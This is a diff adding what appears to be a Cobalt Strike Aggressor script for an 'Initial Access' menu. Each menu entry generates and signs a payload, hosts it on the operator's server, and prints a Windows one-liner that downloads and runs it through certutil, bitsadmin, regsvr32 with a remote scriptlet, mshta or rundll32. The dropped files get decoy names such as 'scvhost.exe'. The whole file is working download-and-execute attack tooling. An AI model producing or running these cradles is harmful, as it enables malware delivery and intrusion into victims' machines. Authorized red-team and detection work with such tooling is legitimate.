@@ -1,0 +1,309 @@
+sub generate_random_url {
+	$path_list = @("img", "imgs", "data", "dev");
+	$ext_list = @("html", "gif", "png", "jpg");
+
+	$path = $path_list[int(rand() * size($path_list))];
+	$c0 = chr(int(rand() * 26) + 97);
+	$c1 = chr(int(rand() * 26) + 97);
+	$c2 = chr(int(rand() * 26) + 97);
+	$ext = $ext_list[int(rand() * size($ext_list))];
+
+	return "/" . $path . "/" . $c0 . $c1 . $c2 . "." . $ext;
+}
+
+sub setup_cmd_certutil_custom_attack {
+    local('%options $url $script $arch $shellcode $cradle $oneliner');
+    %options = $3;
+
+	# load payload
+	$handle = openf(%options["payload"]);
+	$exe   = readb($handle, -1);
+	closef($handle);
+
+	# sign payload
+	$exe = artifact_sign($exe);
+
+    # host the script!
+    $url = site_host(%options["host"], %options["port"], %options["uri"], $exe, "application/octet-stream", "Certutil Web Delivery (Custom) ".$arch);
+
+    # tell the user our URL
+	# certutil.exe -urlcache -f http://10.0.0.5/40564.exe bad.exe && wmic process call create 'bad.exe'
+  	$cradle = "certutil.exe -urlcache -f " . $url . " " . %options["file"] . " && wmic process call create '" . %options["file"] . "'";
+    prompt_text("One-liner: ", $cradle, {});
+}
+
+sub setup_cmd_certutil_attack {
+    local('%options $url $script $arch $shellcode $cradle $oneliner');
+    %options = $3;
+
+    # get the arch right.
+    $arch = iff(%options["x64"] eq "true", "x64", "x86");
+
+    # generate our stageless payload
+    $exe = artifact_payload(%options["listener"], "exe", $arch);
+
+	# sign payload
+	$exe = artifact_sign($exe);
+
+    # host the script!
+    $url = site_host(%options["host"], %options["port"], %options["uri"], $exe, "application/octet-stream", "Certutil Web Delivery (CMD) ".$arch);
+
+    # tell the user our URL
+	# certutil.exe -urlcache -f http://10.0.0.5/40564.exe bad.exe && wmic process call create 'bad.exe'
+  	$cradle = "certutil.exe -urlcache -f " . $url . " " . %options["file"] . " && wmic process call create '" . %options["file"] . "'";
+    prompt_text("One-liner: ", $cradle, {});
+}
+
+sub setup_cmd_bitsadmin_attack {
+    local('%options $url $script $arch $shellcode $cradle $oneliner');
+    %options = $3;
+
+    # get the arch right.
+    $arch = iff(%options["x64"] eq "true", "x64", "x86");
+
+    # generate our stageless payload
+    $exe = artifact_payload(%options["listener"], "exe", $arch);
+
+	# sign payload
+	$exe = artifact_sign($exe);
+
+    # host the script!
+    $url = site_host(%options["host"], %options["port"], %options["uri"], $exe, "application/octet-stream", "Certutil Web Delivery (CMD) ".$arch);
+
+    # tell the user our URL
+	# bitsadmin /transfer myDownloadJob /download /priority normal http://downloadsrv/bad.exe c:\10mb.zip && wmic process call create 'bad.exe'
+  	$cradle = "bitsadmin /transfer myDownloadJob /download /priority normal " . $url . " " . %options["file"] . " && wmic process call create '" . %options["file"] . "'";
+    prompt_text("One-liner: ", $cradle, {});
+}
+
+sub setup_cmd_regsvr32_attack {
+    local('%options $url $script $arch $shellcode $cradle $oneliner');
+    %options = $3;
+
+    # get the arch right.
+    $arch = iff(%options["x64"] eq "true", "x64", "x86");
+
+    # generate and host our stageless payload
+    $exe = artifact_payload(%options["listener"], "exe", $arch);
+
+	# sign payload
+	$exe = artifact_sign($exe);
+
+	# host payload
+    $url_exe = site_host(%options["host"], %options["port"], generate_random_url(), $exe, "application/octet-stream", "Regsvr32 Web Delivery (CMD) ".$arch);
+
+    # generate and host our sct script
+	$handle = openf(script_resource("template.regsvr32.sct"));
+	$data   = readb($handle, -1);
+	closef($handle);
+	$script = strrep($data, '%%COMMAND%%', %options["file"]);
+    $url_script = site_host(%options["host"], %options["port"], generate_random_url(), $script, "text/plain", "Regsvr32 Web Delivery (CMD) ".$arch);
+
+    # tell the user our URL
+	# regsvr32.exe /s /i:http://10.0.0.5/back.sct scrobj.dll
+  	$cradle = "certutil.exe -urlcache -f " . $url_exe . " " . %options["file"] . " && regsvr32.exe /u /n /s /i:" . $url_script . " scrobj.dll";
+    prompt_text("One-liner: ", $cradle, {});
+}
+
+sub setup_cmd_mshta_attack {
+    local('%options $url $script $arch $shellcode $cradle $oneliner');
+    %options = $3;
+
+    # get the arch right.
+    $arch = iff(%options["x64"] eq "true", "x64", "x86");
+
+    # generate and host our stageless payload
+    $exe = artifact_payload(%options["listener"], "exe", $arch);
+
+	# sign payload
+	$exe = artifact_sign($exe);
+
+	# host payload
+    $url_exe = site_host(%options["host"], %options["port"], generate_random_url(), $exe, "application/octet-stream", "MSHTA Web Delivery (CMD) ".$arch);
+
+    # generate and host our sct script
+	$handle = openf(script_resource("template.mshta.sct"));
+	$data   = readb($handle, -1);
+	closef($handle);
+	$script = strrep($data, '%%COMMAND%%', %options["file"]);
+    $url_script = site_host(%options["host"], %options["port"], generate_random_url(), $script, "text/plain", "MSHTA Web Delivery (CMD) ".$arch);
+
+    # tell the user our URL
+	# mshta.exe javascript:a=(GetObject("script:http://10.0.0.5/m.sct")).Exec();close();
+	$cradle = "certutil.exe -urlcache -f " . $url_exe . " " . %options["file"] . " && mshta.exe javascript:a=(GetObject(\"script:". $url_script . "\")).Exec();close();";
+    prompt_text("One-liner: ", $cradle, {});
+}
+
+sub setup_cmd_rundll32_attack {
+    local('%options $url $script $arch $shellcode $cradle $oneliner');
+    %options = $3;
+
+    # get the arch right.
+    $arch = iff(%options["x64"] eq "true", "x64", "x86");
+
+    # generate and host our stageless payload
+    $dll = artifact_payload(%options["listener"], "dll", $arch);
+
+	# sign payload
+	$dll = artifact_sign($dll);
+
+	# host payload
+    $url = site_host(%options["host"], %options["port"], %options["uri"], $dll, "application/octet-stream", "RUNDLL32 Web Delivery (CMD) ".$arch);
+
+    # tell the user our URL
+	$cradle = "certutil.exe -urlcache -f " . $url . " " . %options["file"] . " && rundll32.exe " . %options["file"] . ",RunDLL";
+    prompt_text("One-liner: ", $cradle, {});
+}
+
+
+# create a popup menu!
+popup attacks {
+	menu "CMD Initial Access" {
+		item "Certutil Web Delivery (Custom)" {
+			local('$dialog %defaults');
+
+			# setup our defaults
+			%defaults["uri"]  = generate_random_url();
+			%defaults["host"] = localip();
+			%defaults["port"] = 80;
+			#%defaults["file"] = "C:\\Users\\Default\\AppData\\Local\\Temp\\template.ini";
+			%defaults["file"] = "%temp%\\template.ini";
+
+			# create our dialog
+			$dialog = dialog("Certutil Web Delivery (Custom)", %defaults, &setup_cmd_certutil_custom_attack);
+			dialog_description($dialog, "Certutil Web Delivery attack (Custom)");
+			drow_text($dialog, "uri", "URI Path: ", 20);
+			drow_text($dialog, "host", "Local Host: ");
+			drow_text($dialog, "port", "Local Port: ");
+			drow_file($dialog, "payload", "Payload:");
+			drow_text($dialog, "file", "Filename: ");
+
+			dbutton_action($dialog, "Launch");
+
+			# show our dialog
+			dialog_show($dialog);
+		}
+
+		item "Certutil Web Delivery (Stageless)" {
+			local('$dialog %defaults');
+
+			# setup our defaults
+			%defaults["uri"]  = generate_random_url();
+			%defaults["host"] = localip();
+			%defaults["port"] = 80;
+			#%defaults["file"] = "C:\\Users\\Default\\AppData\\Local\\Temp\\template.ini";
+			%defaults["file"] = "%temp%\\template.ini";
+
+			# create our dialog
+			$dialog = dialog("Certutil Web Delivery (Stageless)", %defaults, &setup_cmd_certutil_attack);
+			dialog_description($dialog, "Certutil Web Delivery attack (Stageless)");
+			drow_text($dialog, "uri", "URI Path: ", 20);
+			drow_text($dialog, "host", "Local Host: ");
+			drow_text($dialog, "port", "Local Port: ");
+			drow_listener_stage($dialog, "listener", "Listener: ");
+			drow_text($dialog, "file", "Filename: ");
+			drow_checkbox($dialog, "x64", "x64: ", "Use x64 payload");
+			dbutton_action($dialog, "Launch");
+
+			# show our dialog
+			dialog_show($dialog);
+		}
+
+		item "Bitsadmin Web Delivery (Stageless)" {
+			local('$dialog %defaults');
+
+			# setup our defaults
+			%defaults["uri"]  = generate_random_url();
+			%defaults["host"] = localip();
+			%defaults["port"] = 80;
+			#%defaults["file"] = "C:\\Users\\Default\\AppData\\Local\\Temp\\template.ini";
+			%defaults["file"] = "%temp%\\template.ini";
+
+			# create our dialog
+			$dialog = dialog("Bitsadmin Web Delivery (Stageless)", %defaults, &setup_cmd_bitsadmin_attack);
+			dialog_description($dialog, "Bitsadmin Web Delivery attack (Stageless)");
+			drow_text($dialog, "uri", "URI Path: ", 20);
+			drow_text($dialog, "host", "Local Host: ");
+			drow_text($dialog, "port", "Local Port: ");
+			drow_listener_stage($dialog, "listener", "Listener: ");
+			drow_text($dialog, "file", "Filename: ");
+			drow_checkbox($dialog, "x64", "x64: ", "Use x64 payload");
+			dbutton_action($dialog, "Launch");
+
+			# show our dialog
+			dialog_show($dialog);
+		}
+
+		item "Regsvr32 Web Delivery (Stageless)" {
+			local('$dialog %defaults');
+
+			# setup our defaults
+			%defaults["host"] = localip();
+			%defaults["port"] = 80;
+			#%defaults["file"] = "C:\\Users\\Public\\scvhost.exe";
+			%defaults["file"] = "%temp%\\\\scvhost.exe";
+
+			# create our dialog
+			$dialog = dialog("Regsvr32 Web Delivery (Stageless)", %defaults, &setup_cmd_regsvr32_attack);
+			dialog_description($dialog, "Regsvr32 Web Delivery attack (Stageless)");
+			drow_text($dialog, "host", "Local Host: ");
+			drow_text($dialog, "port", "Local Port: ");
+			drow_listener_stage($dialog, "listener", "Listener: ");
+			drow_text($dialog, "file", "Filename: ");
+			drow_checkbox($dialog, "x64", "x64: ", "Use x64 payload");
+			dbutton_action($dialog, "Launch");
+
+			# show our dialog
+			dialog_show($dialog);
+		}
+
+		item "MSHTA Web Delivery (Stageless)" {
+			local('$dialog %defaults');
+
+			# setup our defaults
+			%defaults["host"] = localip();
+			%defaults["port"] = 80;
+			#%defaults["file"] = "C:\\Users\\Public\\scvhost.exe";
+			%defaults["file"] = "%temp%\\\\scvhost.exe";
+
+			# create our dialog
+			$dialog = dialog("MSHTA Web Delivery (Stageless)", %defaults, &setup_cmd_mshta_attack);
+			dialog_description($dialog, "MSHTA Web Delivery attack (Stageless)");
+			drow_text($dialog, "host", "Local Host: ");
+			drow_text($dialog, "port", "Local Port: ");
+			drow_listener_stage($dialog, "listener", "Listener: ");
+			drow_text($dialog, "file", "Filename: ");
+			drow_checkbox($dialog, "x64", "x64: ", "Use x64 payload");
+			dbutton_action($dialog, "Launch");
+
+			# show our dialog
+			dialog_show($dialog);
+		}
+
+		item "Rundll32 Web Delivery (Stageless)" {
+			local('$dialog %defaults');
+
+			# setup our defaults
+			%defaults["uri"]  = generate_random_url();
+			%defaults["host"] = localip();
+			%defaults["port"] = 80;
+			#%defaults["file"] = "C:\\Users\\Default\\AppData\\Local\\Temp\\template.ini";
+			%defaults["file"] = "%temp%\\template.ini";
+
+			# create our dialog
+			$dialog = dialog("Rundll32 Web Delivery (Stageless)", %defaults, &setup_cmd_rundll32_attack);
+			dialog_description($dialog, "Rundll32 Web Delivery attack (Stageless)");
+			drow_text($dialog, "uri", "URI Path: ", 20);
+			drow_text($dialog, "host", "Local Host: ");
+			drow_text($dialog, "port", "Local Port: ");
+			drow_listener_stage($dialog, "listener", "Listener: ");
+			drow_text($dialog, "file", "Filename: ");
+			drow_checkbox($dialog, "x64", "x64: ", "Use x64 payload");
+			dbutton_action($dialog, "Launch");
+
+			# show our dialog
+			dialog_show($dialog);
+		}
+
+	}
+}
